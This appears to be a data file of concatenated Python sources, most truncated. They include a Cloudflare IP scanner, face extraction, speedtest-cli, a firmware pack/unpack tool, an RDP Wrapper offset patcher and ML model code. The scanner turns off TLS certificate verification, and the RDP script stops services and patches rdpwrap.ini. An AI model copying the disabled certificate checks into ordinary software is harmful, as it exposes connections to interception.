B64Decoder,\n\t\"ScheduleToCondCAPGUI\": ScheduleToCond,\n\t\"ScheduleToModelCAPGUI\": ScheduleToModel,\n\t\"PromptToScheduleCAPGUI\": PromptToSchedule,\n}\n\nNODE_DISPLAY_NAME_MAPPINGS = {\n\t\"UNETLoaderCAPGUI\": \"CAPGUI API UNETLoader\",\n\t\"CLIPLoaderCAPGUI\": \"CAPGUI API CLIPLoader\",\n\t\"Base64ToImageCAPGUI\": \"CAPGUI API Base64 Image Decoder\",\n\t\"ScheduleToCondCAPGUI\": \"CAPGUI Schedule To Conditioning\",\n\t\"ScheduleToModelCAPGUI\": \"CAPGUI Schedule To Model\",\n\t\"PromptToScheduleCAPGUI\": \"CAPGUI Prompt To Schedule\",\n}",
    "import sys , os  , re\r\nfrom concurrent.futures import ThreadPoolExecutor\r\nfrom functools import partial\r\nfrom pathlib import Path\r\nimport datetime  \r\nimport socket\r\nimport zipfile\r\nimport shutil\r\nimport http.client\r\nimport socket\r\nimport ssl\r\nimport time\r\n\r\nimport argparse\r\nimport geoip2.database\r\n\r\nclass Colors:\r\n    RESET = \"\\033[0m\"\r\n    RED = \"\\033[91m\"\r\n    GREEN = \"\\033[92m\"\r\n    YELLOW = \"\\033[93m\"\r\n    BLUE = \"\\033[94m\"\r\n    MAGENTA = \"\\033[95m\"\r\n    CYAN = \"\\033[96m\"\r\n    WHITE = \"\\033[97m\" \r\n\r\ntotale = 0\r\nsuccess = 0\r\nfail = 0\r\nzip_url = \"zip.baipiao.eu.org\"\r\nrequest_url = \"speed.cloudflare.com\"\r\nrequest_url_path = \"/cdn-cgi/trace\"\r\ntimeout = 4 \r\nno_test = False \r\nheaders = {\"user-agent\": \"Mozilla/5.0\"}\r\nenable_tls = True\r\nverbose = False\r\nmax_workers = 10\r\ncountry_names = []\r\ncountry_continent_names = []\r\n\r\ndatabase_file = Path(__file__).with_name('GeoLite2-Country.mmdb')\r\nasn_database_file = Path(__file__).with_name('GeoLite2-ASN.mmdb')\r\n\r\nscript_dir = Path(__file__).parent\r\nresult_dir_day = datetime.datetime.now().strftime('%Y-%m-%d')\r\ntimestamp = f\"{datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}\"\r\nresult_folder = f\"{script_dir}\\\\Result\\\\{result_dir_day}\\\\{timestamp}\"\r\n\r\n\r\ndef save_to_file(data , country_name):\r\n    os.makedirs(result_folder, exist_ok=True)\r\n    result_file = os.path.join(result_folder, f\"{country_name}_{timestamp}.txt\")\r\n    with open(result_file, \"a\") as f :\r\n        f.writelines(f\"{data}\\n\")\r\n        f.close()\r\n\r\n\r\ndef banner():\r\n    banner = \"\"\"\r\n  \u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2557 -      -\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2557 \r\n \u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d -      -\u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\r\n \u2588\u2588\u2551     \u2588\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2551  \u2588\u2588\u2588\u2557-\u2588\u2588\u2588\u2588\u2588\u2557-\u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\r\n \u2588\u2588\u2551     \u2588\u2588\u2554\u2550\u2550\u255d  \u2588\u2588\u2551   \u2588\u2588\u2551-\u255a\u2550\u2550\u2550\u2550\u255d-\u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2550\u255d \r\n \u255a\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551     \u255a\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d-      -\u2588\u2588\u2551\u2588\u2588\u2551     \r\n  \u255a\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u255d      \u255a\u2550\u2550\u2550\u2550\u2550\u255d -      -\u255a\u2550\u255d\u255a\u2550\u255d     \r\n\"\"\"\r\n\r\n    for l in banner.split('\\n') :\r\n        split = l.split('-')\r\n        if len(split) > 1:\r\n            print(Colors.RED + split[0], Colors.WHITE + split[1], Colors.YELLOW + split[2] + Colors.RESET)\r\n\r\n    max_banner_lenght =  max(len(banner) for banner in banner.split('\\n'))\r\n    print(Colors.WHITE + \"\".ljust(max_banner_lenght, '\u2500'))\r\n    space = \"   \"#.ljust(int(max_banner_lenght / 4 ), ' ') \r\n    print (space + \"\u2022Author  : \" , \"! AZERTY9 !\" )\r\n    print (space + \"\u2022Github  : \" , \"https://github.com/az3rty9\" )\r\n    print (space + \"Telegram : \" , \"https://t.me/az3rty9\" ) \r\n    print (space + \"\u2022Version : \" , \"1.0\" )\r\n    \r\n    print(\"\".ljust(max_banner_lenght, '\u2500'))\r\n\r\n\r\ndef remove_duplicates(input_file):\r\n    with open(input_file, 'r') as file:\r\n        lines = file.read().split('\\n') #.readlines()\r\n        unique_urls = list(set(lines))#list(dict.fromkeys(lines))\r\n    return unique_urls       \r\n\r\n\r\ndef print_ascii_table(data):\r\n\r\n    max_country_len = max(len(country) for country in data.keys())\r\n    max_count_len = max(len(str(count)) for count in data.values())\r\n\r\n    if max_count_len < 5 :\r\n        max_count_len = max_count_len + (5 - max_count_len  )\r\n    if max_country_len < 7 :\r\n        max_country_len = max_country_len + (7 - max_country_len)\r\n\r\n    print(f\"+{'-' * (max_country_len + 2)}+{'-' * (max_count_len + 2)}+\")\r\n    print(f\"| {'Country':<{max_country_len}} | {'Count':<{max_count_len }} |\")\r\n    print(f\"+{'-' * (max_country_len + 2)}+{'-' * (max_count_len + 2)}+\")\r\n\r\n\r\n    for country, count in data.items():\r\n        print(f\"| {country:<{max_country_len}} | { count:>{ max_count_len}} |\")\r\n\r\n\r\n    print(f\"+{'-' * (max_country_len + 2)}+{'-' * (max_count_len + 2)}+\")\r\n\r\n\r\ndef create_ssl_connection(ip_addr, port, timeout):\r\n    sock = socket.create_connection((ip_addr, port), timeout=timeout)\r\n    context = ssl.create_default_context()\r\n    context.check_hostname = False\r\n    context.verify_mode = ssl.CERT_NONE\r\n    ssl_sock = context.wrap_socket(sock, server_hostname=request_url)\r\n    return ssl_sock\r\n\r\n\r\ndef test_ipaddress (ip_addr, port):\r\n    try:  \r\n        conn = None\r\n        if int(port) in [443,2053,2083,2087,2096,8443] :\r\n            conn = create_ssl_connection(ip_addr, port, timeout)\r\n        else:\r\n           conn = socket.create_connection((ip_addr, port), timeout=timeout)  \r\n           \r\n        #,context=ssl._create_unverified_context()\r\n        client = http.client.HTTPSConnection(request_url) if not enable_tls else http.client.HTTPSConnection(request_url)\r\n        client.sock = conn\r\n                        \r\n        start_time = time.time()\r\n        client.request(\"GET\", request_url_path,headers=headers)\r\n        response = client.getresponse()\r\n        tcp_duration = time.time() - start_time\r\n        body = response.read().decode(\"utf-8\")\r\n        #print(body)\r\n        #matches = dict(re.findall(r\"(\\w+)=(.+)\", body))\r\n        #if matches.get('ip') == ip_addr:\r\n        if f\"ip={ip_addr}\" in body : \r\n            latency = f\"{tcp_duration * 1000:.0f} ms\"\r\n            return latency#, matches\r\n        conn.close()\r\n        return None       \r\n    except Exception as e:\r\n        #print(f'{Colors.RED}[ERROR]{Colors",
    "import asyncio\nimport face_recognition\nfrom PIL import Image, ImageDraw\nimport io\nimport base64\n\n\ndef extract_faces(image_bytes, scale_factor=1.0, aspect_ratio=1.0):\n    try:\n        # Load the image with face_recognition\n        image = face_recognition.load_image_file(io.BytesIO(image_bytes))\n\n        # Find all face locations in the image\n        face_locations = face_recognition.face_locations(image)\n\n        extracted_faces = []\n\n        # Loop through each face location\n        for i, (top, right, bottom, left) in enumerate(face_locations):\n            # Expand or shrink the bounding box based on the scale factor\n            height = bottom - top\n            width = right - left\n\n            # Calculate new bounding box coordinates\n            expanded_top = max(0, int(top - scale_factor * height))\n            expanded_bottom = min(image.shape[0], int(bottom + scale_factor * height))\n            expanded_left = max(0, int(left - scale_factor * width))\n            expanded_right = min(image.shape[1], int(right + scale_factor * width))\n\n            # Crop each face\n            face_image = image[expanded_top:expanded_bottom, expanded_left:expanded_right]\n\n            # Calculate the width and height of the cropped image\n            new_width = face_image.shape[1]\n            new_height = int(new_width / aspect_ratio)\n\n            # Ensure the image has the desired aspect ratio\n            if new_height > face_image.shape[0]:\n                new_height = face_image.shape[0]\n                new_width = int(new_height * aspect_ratio)\n\n            # Calculate the center coordinates for cropping a rectangle\n            center_x = face_image.shape[1] // 2\n            center_y = face_image.shape[0] // 2\n\n            # Calculate the coordinates for cropping a rectangle around the center\n            crop_left = max(0, center_x - new_width // 2)\n            crop_right = min(face_image.shape[1], center_x + new_width // 2)\n            crop_top = max(0, center_y - new_height // 2)\n            crop_bottom = min(face_image.shape[0], center_y + new_height // 2)\n\n            # Crop the image to a rectangle\n            face_image = face_image[crop_top:crop_bottom, crop_left:crop_right]\n\n            pil_image = Image.fromarray(face_image)\n\n            # Convert PIL image to bytes\n            img_byte_array = io.BytesIO()\n            pil_image.save(img_byte_array, format=\"PNG\")\n            img_byte_array.seek(0)\n\n            # Append the image bytes and filename to the list\n            extracted_faces.append((f\"face_{i + 1}.png\", img_byte_array))\n\n        return extracted_faces\n    except Exception as e:\n        return [str(e)]\n\n\n",
    "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n# Copyright 2012 Matt Martz\n# All Rights Reserved.\n#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n#    a copy of the License at\n#\n#         http://www.apache.org/licenses/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n#    distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#    License for the specific language governing permissions and limitations\n#    under the License.\n\nimport csv\nimport datetime\nimport errno\nimport math\nimport os\nimport platform\nimport re\nimport signal\nimport socket\nimport sys\nimport threading\nimport timeit\nimport xml.parsers.expat\n\ntry:\n    import gzip\n    GZIP_BASE = gzip.GzipFile\nexcept ImportError:\n    gzip = None\n    GZIP_BASE = object\n\n__version__ = '2.1.4b1'\n\n\nclass FakeShutdownEvent(object):\n    \"\"\"Class to fake a threading.Event.isSet so that users of this module\n    are not required to register their own threading.Event()\n    \"\"\"\n\n    @staticmethod\n    def isSet():\n        \"Dummy method to always return false\"\"\"\n        return False\n\n    is_set = isSet\n\n\n# Some global variables we use\nDEBUG = False\n_GLOBAL_DEFAULT_TIMEOUT = object()\nPY25PLUS = sys.version_info[:2] >= (2, 5)\nPY26PLUS = sys.version_info[:2] >= (2, 6)\nPY32PLUS = sys.version_info[:2] >= (3, 2)\nPY310PLUS = sys.version_info[:2] >= (3, 10)\n\n# Begin import game to handle Python 2 and Python 3\ntry:\n    import json\nexcept ImportError:\n    try:\n        import simplejson as json\n    except ImportError:\n        json = None\n\ntry:\n    import xml.etree.ElementTree as ET\n    try:\n        from xml.etree.ElementTree import _Element as ET_Element\n    except ImportError:\n        pass\nexcept ImportError:\n    from xml.dom import minidom as DOM\n    from xml.parsers.expat import ExpatError\n    ET = None\n\ntry:\n    from urllib2 import (urlopen, Request, HTTPError, URLError,\n                         AbstractHTTPHandler, ProxyHandler,\n                         HTTPDefaultErrorHandler, HTTPRedirectHandler,\n                         HTTPErrorProcessor, OpenerDirector)\nexcept ImportError:\n    from urllib.request import (urlopen, Request, HTTPError, URLError,\n                                AbstractHTTPHandler, ProxyHandler,\n                                HTTPDefaultErrorHandler, HTTPRedirectHandler,\n                                HTTPErrorProcessor, OpenerDirector)\n\ntry:\n    from httplib import HTTPConnection, BadStatusLine\nexcept ImportError:\n    from http.client import HTTPConnection, BadStatusLine\n\ntry:\n    from httplib import HTTPSConnection\nexcept ImportError:\n    try:\n        from http.client import HTTPSConnection\n    except ImportError:\n        HTTPSConnection = None\n\ntry:\n    from httplib import FakeSocket\nexcept ImportError:\n    FakeSocket = None\n\ntry:\n    from Queue import Queue\nexcept ImportError:\n    from queue import Queue\n\ntry:\n    from urlparse import urlparse\nexcept ImportError:\n    from urllib.parse import urlparse\n\ntry:\n    from urlparse import parse_qs\nexcept ImportError:\n    try:\n        from urllib.parse import parse_qs\n    except ImportError:\n        from cgi import parse_qs\n\ntry:\n    from hashlib import md5\nexcept ImportError:\n    from md5 import md5\n\ntry:\n    from argparse import ArgumentParser as ArgParser\n    from argparse import SUPPRESS as ARG_SUPPRESS\n    PARSER_TYPE_INT = int\n    PARSER_TYPE_STR = str\n    PARSER_TYPE_FLOAT = float\nexcept ImportError:\n    from optparse import OptionParser as ArgParser\n    from optparse import SUPPRESS_HELP as ARG_SUPPRESS\n    PARSER_TYPE_INT = 'int'\n    PARSER_TYPE_STR = 'string'\n    PARSER_TYPE_FLOAT = 'float'\n\ntry:\n    from cStringIO import StringIO\n    BytesIO = None\nexcept ImportError:\n    try:\n        from StringIO import StringIO\n        BytesIO = None\n    except ImportError:\n        from io import StringIO, BytesIO\n\ntry:\n    import __builtin__\nexcept ImportError:\n    import builtins\n    from io import TextIOWrapper, FileIO\n\n    class _Py3Utf8Output(TextIOWrapper):\n        \"\"\"UTF-8 encoded wrapper around stdout for py3, to override\n        ASCII stdout\n        \"\"\"\n        def __init__(self, f, **kwargs):\n            buf = FileIO(f.fileno(), 'w')\n            super(_Py3Utf8Output, self).__init__(\n                buf,\n                encoding='utf8',\n                errors='strict'\n            )\n\n        def write(self, s):\n            super(_Py3Utf8Output, self).write(s)\n            self.flush()\n\n    _py3_print = getattr(builtins, 'print')\n    try:\n        _py3_utf8_stdout = _Py3Utf8Output(sys.stdout)\n        _py3_utf8_stderr = _Py3Utf8Output(sys.stderr)\n    except OSError:\n        # sys.stdout/sys.stderr is not a compatible stdout/stderr object\n        # just use it and hope things go ok\n        _py3_utf8_stdout = sys.stdout\n        _py3_utf8_stderr = sys.stderr\n\n    def to_utf8(v):\n",
    "# -*- encoding: utf-8 -*-\n'''\n@File    :   image_tokenizer.py\n@Time    :   2021/12/20 14:19:49\n@Author  :   Ming Ding \n@Contact :   dm18@mails.tsinghua.edu.cn\n'''\n\n# here put the import lib\nimport os\nimport sys\nimport math\nimport random\n\nimport torch\nimport torch.nn.functional as F\nfrom torchvision import transforms \n\nfrom .vqvae import load_default_HVQVAE, load_ckpt\n\nclass ImageTokenizer(object):\n    def __init__(self,\n                model_path,\n                device='cuda',\n                fp16=True):\n        model = load_default_HVQVAE()\n        model = load_ckpt(model, model_path)\n        model = model.to(device)\n        model.eval()\n        \n        self.tr_normalize = transforms.Normalize(\n            [0.79093, 0.76271, 0.75340], \n            [0.30379, 0.32279, 0.32800]\n            )\n\n        self.model = model\n        self.device = device\n        self.fp16 = fp16\n        self.num_tokens = model.quantize.n_embed\n        \n        if fp16:\n            model = model.half()\n\n    def __len__(self):\n        return self.num_tokens\n\n    def encode(self, image_torch, l=1):\n        '''Convert a batch of img to code\n        Args:\n            model: The tokenizer model.\n            img: [b, c, h, w]\n        '''\n        if len(image_torch.shape) == 3:\n            image_torch = image_torch.unsqueeze(0)\n        img = self.tr_normalize(image_torch).to(self.device)\n        if self.fp16:\n            img = img.half()\n        with torch.no_grad():\n            quant, diff, id = self.model.single_encode(img, l)\n        return id.view(img.shape[0], -1)\n\n    def decode(self, codes, l=1):\n        '''Convert a batch of code to imgs\n        Args:\n            codes : [b, h, w] or [b, h*w] or [h*w] LongTensor / list\n        '''\n        if isinstance(codes, list):\n            codes = torch.tensor(codes, dtype=torch.long, device=self.device)\n        if len(codes.shape) == 1:   \n            codes = codes.unsqueeze(0)\n        if len(codes.shape) == 2:\n            s = int(math.sqrt(len(codes.view(-1))) + 1e-5)\n            codes = codes.view(codes.shape[0], s, s)\n        with torch.no_grad():\n            out = self.model.single_decode_code(codes, l)\n            out = out * torch.tensor([0.30379, 0.32279, 0.32800], device=out.device).view(1, -1, 1, 1) + torch.tensor([0.79093, 0.76271, 0.75340], device=out.device).view(1, -1, 1, 1)\n        return out",
    "#!/usr/bin/env python3\n\"\"\"\nfwpack - Pack/Unpack DRC/DRH firmware files\nCreated in 2024 by GaryOderNichts\n<https://github.com/GaryOderNichts/drc-fw-patches>\n\nCredits to drxtool for the firmware header logic and extracted files structure.\n\"\"\"\n\nimport sys, os\nimport binascii\nimport construct\n\nclass FirmwareType:\n    FIRMWARE_TYPE_DRC = 0x01010000\n    FIRMWARE_TYPE_DRH = 0x00010000\n\nBlobHeader = construct.Struct(\n    \"imageVersion\" / construct.Int32ub,\n    \"blockSize\" / construct.Int32ub,\n    \"sequencePerSession\" / construct.Int32ub,\n    \"imageSize\" / construct.Int32ub,\n)\nassert(BlobHeader.sizeof() == 0x10)\n\nFirmwareHeader = construct.Struct(\n    \"type\" / construct.Int32ul,\n    \"superCRCs\" / construct.Array(4, construct.Int32ul),\n    construct.Padding(0xFE8),\n    \"headerCRC\" / construct.Int32ul,\n    \"subCRCs\" / construct.Array(0x1000, construct.Int32ul),\n)\nassert(FirmwareHeader.sizeof() == 0x5000)\n\nFirmwareSection = construct.Struct(\n    \"offset\" / construct.Int32ul,\n    \"size\" / construct.Int32ul,\n    \"name\" / construct.PaddedString(4, \"ascii\"),\n    \"version\" / construct.Int32ul,\n)\nassert(FirmwareSection.sizeof() == 0x10)\n\nFirmwareFile = construct.Struct(\n    \"blobHeader\" / BlobHeader,\n    \"firmwareHeader\" / FirmwareHeader,\n    \"firmwareData\" / construct.Bytes(construct.this.blobHeader.imageSize - FirmwareHeader.sizeof()),\n)\n\n# Thanks to drxtool for the crctable logic\ndef verify_firmware_header(fw) -> bool:\n    # Verify header CRC\n    header_crc = binascii.crc32(FirmwareHeader.build(fw.firmwareHeader)[0:0xFFC])\n    if header_crc != fw.firmwareHeader.headerCRC:\n        return False\n    \n    # Verify super crcs\n    subcrc_data = construct.Array(0x1000, construct.Int32ul).build(fw.firmwareHeader.subCRCs)\n    for i in range(4):\n        super_crc = binascii.crc32(subcrc_data[i*0x1000:i*0x1000+0x1000])\n        if super_crc != fw.firmwareHeader.superCRCs[i]:\n            return False\n\n    # Verify sub crcs\n    for i in range(len(fw.firmwareData) // 0x1000 + 1):\n        offset = i * 0x1000\n        length = 0x1000\n        if len(fw.firmwareData) - offset < length:\n            length = len(fw.firmwareData) - offset\n\n        sub_crc = binascii.crc32(fw.firmwareData[offset:offset + length])\n        if sub_crc != fw.firmwareHeader.subCRCs[i]:\n            return False\n\n    return True\n\ndef build_firmware_header(blob_type, firmware_data) -> dict:\n    # Calculate CRC for every 0x1000 bytes of firmware data\n    sub_crcs = [0] * 0x1000\n    for i in range(len(firmware_data) // 0x1000 + 1):\n        offset = i * 0x1000\n        length = 0x1000\n        if len(firmware_data) - offset < length:\n            length = len(firmware_data) - offset\n\n        sub_crcs[i] = binascii.crc32(firmware_data[offset:offset + length])\n\n    # Calculate the super CRCs\n    super_crcs = [0] * 4\n    subcrc_data = construct.Array(0x1000, construct.Int32ul).build(sub_crcs)\n    for i in range(4):\n        super_crcs[i] = binascii.crc32(subcrc_data[i*0x1000:i*0x1000+0x1000])\n\n    firmware_header = dict(type=blob_type, superCRCs=super_crcs, headerCRC=0, subCRCs=sub_crcs)\n\n    # Calculate the header CRC\n    firmware_header[\"headerCRC\"] = binascii.crc32(FirmwareHeader.build(firmware_header)[0:0xFFC])\n\n    return firmware_header\n\ndef unpack_firmware(source_file, dest_dir):\n    fw = FirmwareFile.parse_file(source_file)\n    if not verify_firmware_header(fw):\n        print(\"Firmware header verification failed\")\n        sys.exit(1)\n\n    if fw.firmwareHeader.type == FirmwareType.FIRMWARE_TYPE_DRC:\n        print(f\"DRC firmware version 0x{fw.blobHeader.imageVersion:08x}\")\n    elif fw.firmwareHeader.type == FirmwareType.FIRMWARE_TYPE_DRH:\n        print(f\"DRH firmware version 0x{fw.blobHeader.imageVersion:08x}\")\n    else:\n        print(f\"Unsupported firmware type 0x{fw.firmwareHeader.type:08x}\")\n        sys.exit(1)\n\n    if not os.path.isdir(dest_dir):\n        os.mkdir(dest_dir)\n\n    # Write blob header and type\n    BlobHeader.build_file(fw.blobHeader, os.path.join(dest_dir, \"blob_header.bin\"))\n    construct.Int32ul.build_file(fw.firmwareHeader.type, os.path.join(dest_dir, \"blob_type.bin\"))\n\n    # Assume first part of the data is the index\n    index = FirmwareSection.parse(fw.firmwareData)\n\n    # Parse sections\n    sections = construct.Array(index.size // FirmwareSection.sizeof(), FirmwareSection).parse(fw.firmwareData)\n    for s in sections:\n        print(f\"Saving {s.name} version 0x{s.version:08x} offset 0x{s.offset} size 0x{s.size}\")\n\n        # write section to file\n        with open(os.path.join(dest_dir, s.name + \".bin\"), \"wb\") as f:\n            f.write(fw.firmwareData[s.offset:s.offset + s.size])\n\ndef pack_firmware(source_dir, dest_file):\n    # Read blob header and type\n    blob_header = BlobHeader.parse_file(os.path.join(source_dir, \"blob_header.bin\"))\n    blob_type = construct.Int32ul.parse_file(os.path.join(source_dir, \"blob_type.bin\"))\n\n    # Parse sections from INDX\n    firmware_data = b\"\"\n    sections = construct.GreedyRange(FirmwareSection).parse_file(os.path.joi",
    "import sys\nimport ctypes, os\n\n\ndef check_administrator() -> bool:\n    \"\"\"\n    Check if the program has administrator rights.\n    \"\"\"\n    try:\n        is_admin = os.getuid() == 0\n    except AttributeError:\n        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0\n    return is_admin\n\ndef read_file(path: str) -> str:\n    \"\"\"\n    Reads the offsets.txt file provided and returns its contents.\n\n    Args:\n        path: Path of offsets.txt\n    \n    Returns:\n        contents of offsets.txt\n    \"\"\"\n    print(path)\n    try:\n        with open(path, 'r') as file:\n            contents = file.read()\n            if contents == None or contents == \"\\n\":\n                print(\"\\033[91moffsets.txt was found but is empty... \\\nHave you run autofinder.bat yet?\\033[0m\")\n    except FileNotFoundError:\n        print(\"\\033[91moffsets.txt was not found. Is the path set correctly?\\\n\\033[0m\")\n        raise FileNotFoundError\n\n    return contents\n\ndef disable_rdp_service() -> None:\n    \"\"\"\n    Stops Remote Desktop Services so that rdpwrap.ini can be modified.\n    \"\"\"\n    os.system(f'net stop \"Remote Desktop Services\"')\n\ndef enable_rdp_service() -> None:\n    \"\"\"\n    Starts Remote Desktop Services so that RDP will work again.\n    \"\"\"\n    os.system(f'net start \"Remote Desktop Services\"')\n\n\ndef modify_rdpwrap(offsets) -> None:\n    \"\"\"\n    Modifies rdpwrap.ini with the new offsets in offsets.txt\n\n    Args:\n        offsets: Offsets from offsets.txt\n    \"\"\"\n    with open('C:\\\\Program Files\\\\RDP Wrapper\\\\rdpwrap.ini', 'r+') as file:\n        original_contents = file.read()\n\n        sections = original_contents.split(\"\\n\\n\")\n        \n        start_section = sections[:4]\n        win_version_specifics = sections[4:]\n\n        \n        non_slint = [x for x in win_version_specifics if '-SLInit' not in x]\n        slint = [x for x in win_version_specifics if '-SLInit' in x]\n        \"\"\"\n        print(start_section)\n        print(\"\\n\"*10)\n        print(non_slint)\n        print(\"\\n\"*10)\n        print(slint)\n        print(\"\\n\"*10)\n        \"\"\"\n\n        non_slint_new, slint_new = offsets.split(\"\\n\\n\")\n        non_slint_new_ver = non_slint_new[1:].split(']')[0].split('.')\n        slint_new_ver = slint_new[1:].split('-')[0].split('.')\n\n        for index, version in enumerate(non_slint):\n            version_split = version[1:].split(']')[0].split('.')\n            if(len(version_split) != 4):\n                continue\n            if (int(non_slint_new_ver[0]) <= int(version_split[0])\n                and int(non_slint_new_ver[1]) <= int(version_split[1])\n                and int(non_slint_new_ver[2]) <= int(version_split[2])\n                and int(non_slint_new_ver[3]) <= int(version_split[3])):\n                if version_split == non_slint_new_ver:\n                    print(\"\\033[91mYour rdpwrap.ini already includes the new Non-SLInit offsets\\033[0m\")\n                    print(f\"\\033[91mThe offset verson was {non_slint_new_ver}\\033[0m\")\n                    break\n                non_slint.insert(index, non_slint_new)\n                print(f\"{version_split} was found, inserting before it.\")\n                print(f\"Inserted {non_slint_new}\")\n                break\n\n        print(\"\\n\")\n\n        for index, version in enumerate(slint[1:]):\n            version_split = version[1:].split('-')[0].split('.')\n            if(len(version_split) != 4):\n                continue\n            if (int(slint_new_ver[0]) <= int(version_split[0])\n                and int(slint_new_ver[1]) <= int(version_split[1])\n                and int(slint_new_ver[2]) <= int(version_split[2])\n                and int(slint_new_ver[3]) <= int(version_split[3])):\n                if version_split == slint_new_ver:\n                    print(\"\\033[91mYour rdpwrap.ini already includes the new SLInit offsets\\033[0m\")\n                    print(f\"\\033[91mThe offset verson was {slint_new_ver}\\033[0m\")\n                    break\n                slint.insert(index + 1, slint_new)\n                print(f\"{version_split} was found, inserting before it.\")\n                print(f\"Inserted {slint_new}\")\n                break\n        \n        file.seek(0)\n        file.write(\"\\n\\n\".join(start_section) + \"\\n\\n\" + \"\\n\\n\".join(non_slint) \n                   + \"\\n\\n\" + \"\\n\\n\".join(slint))\n\ndef main():\n    \"\"\"\n    Main function.\n    \"\"\"\n    if not check_administrator():\n        print(\"\\033[91mThe executable is not being run with administrator \\\nrights.\\033[0m\")\n        print(\"\\033[91mHere's some things to check:\\033[0m\")\n        print(\"\\033[91mDid you remember to run as administrator?\\033[0m\")\n        print(\"\\033[91mIs some antivirus enabled?\\033[0m\")\n        raise PermissionError\n    for arg in sys.argv:\n        print(arg)\n\n    path = os.getcwd()\n    parent = os.path.dirname(path)\n    contents = read_file(parent + \"\\offsets.txt\")\n\n    disable_rdp_service()\n\n    modify_rdpwrap(contents)\n\n    enable_rdp_service()\n\n\n\nif __name__ == \"__main__\":\n    main()",
    "\"\"\"\nImplementations of autoregressive transforms.\nCode taken from https://github.com/bayesiains/nsf\n\"\"\"\n\nimport numpy as np\nimport torch\nfrom torch.nn import functional as F\n\nfrom ... import utils\nfrom ..affine.autoregressive import Autoregressive\nfrom normflows.nets import made as made_module\nfrom normflows.utils import splines\nfrom normflows.utils.nn import PeriodicFeaturesElementwise\n\n\nclass MaskedPiecewiseRationalQuadraticAutoregressive(Autoregressive):\n    def __init__(\n        self,\n        features,\n        hidden_features,\n        context_features=None,\n        num_bins=10,\n        tails=None,\n        tail_bound=1.0,\n        num_blocks=2,\n        use_residual_blocks=True,\n        random_mask=False,\n        permute_mask=False,\n        activation=F.relu,\n        dropout_probability=0.0,\n        use_batch_norm=False,\n        init_identity=True,\n        min_bin_width=splines.DEFAULT_MIN_BIN_WIDTH,\n        min_bin_height=splines.DEFAULT_MIN_BIN_HEIGHT,\n        min_derivative=splines.DEFAULT_MIN_DERIVATIVE,\n    ):\n        self.num_bins = num_bins\n        self.min_bin_width = min_bin_width\n        self.min_bin_height = min_bin_height\n        self.min_derivative = min_derivative\n        self.tails = tails\n\n        if isinstance(self.tails, list) or isinstance(self.tails, tuple):\n            ind_circ = []\n            for i in range(features):\n                if self.tails[i] == \"circular\":\n                    ind_circ += [i]\n            if torch.is_tensor(tail_bound):\n                scale_pf = np.pi / tail_bound[ind_circ]\n            else:\n                scale_pf = np.pi / tail_bound\n            preprocessing = PeriodicFeaturesElementwise(features, ind_circ, scale_pf)\n        else:\n            preprocessing = None\n\n        autoregressive_net = made_module.MADE(\n            features=features,\n            hidden_features=hidden_features,\n            context_features=context_features,\n            num_blocks=num_blocks,\n            output_multiplier=self._output_dim_multiplier(),\n            use_residual_blocks=use_residual_blocks,\n            random_mask=random_mask,\n            permute_mask=permute_mask,\n            activation=activation,\n            dropout_probability=dropout_probability,\n            use_batch_norm=use_batch_norm,\n            preprocessing=preprocessing,\n        )\n\n        if init_identity:\n            torch.nn.init.constant_(autoregressive_net.final_layer.weight, 0.0)\n            torch.nn.init.constant_(\n                autoregressive_net.final_layer.bias,\n                np.log(np.exp(1 - min_derivative) - 1),\n            )\n\n        super().__init__(autoregressive_net)\n\n        if torch.is_tensor(tail_bound):\n            self.register_buffer(\"tail_bound\", tail_bound)\n        else:\n            self.tail_bound = tail_bound\n\n    def _output_dim_multiplier(self):\n        if self.tails == \"linear\":\n            return self.num_bins * 3 - 1\n        elif self.tails == \"circular\":\n            return self.num_bins * 3\n        else:\n            return self.num_bins * 3 + 1\n\n    def _elementwise(self, inputs, autoregressive_params, inverse=False):\n        batch_size, features = inputs.shape[0], inputs.shape[1]\n\n        transform_params = autoregressive_params.view(\n            batch_size, features, self._output_dim_multiplier()\n        )\n\n        unnormalized_widths = transform_params[..., : self.num_bins]\n        unnormalized_heights = transform_params[..., self.num_bins : 2 * self.num_bins]\n        unnormalized_derivatives = transform_params[..., 2 * self.num_bins :]\n\n        if hasattr(self.autoregressive_net, \"hidden_features\"):\n            unnormalized_widths /= np.sqrt(self.autoregressive_net.hidden_features)\n            unnormalized_heights /= np.sqrt(self.autoregressive_net.hidden_features)\n\n        if self.tails is None:\n            spline_fn = splines.rational_quadratic_spline\n            spline_kwargs = {}\n        else:\n            spline_fn = splines.unconstrained_rational_quadratic_spline\n            spline_kwargs = {\"tails\": self.tails, \"tail_bound\": self.tail_bound}\n\n        outputs, logabsdet = spline_fn(\n            inputs=inputs,\n            unnormalized_widths=unnormalized_widths,\n            unnormalized_heights=unnormalized_heights,\n            unnormalized_derivatives=unnormalized_derivatives,\n            inverse=inverse,\n            min_bin_width=self.min_bin_width,\n            min_bin_height=self.min_bin_height,\n            min_derivative=self.min_derivative,\n            **spline_kwargs\n        )\n\n        return outputs, utils.sum_except_batch(logabsdet)\n\n    def _elementwise_forward(self, inputs, autoregressive_params):\n        return self._elementwise(inputs, autoregressive_params)\n\n    def _elementwise_inverse(self, inputs, autoregressive_params):\n        return self._elementwise(inputs, autoregressive_params, 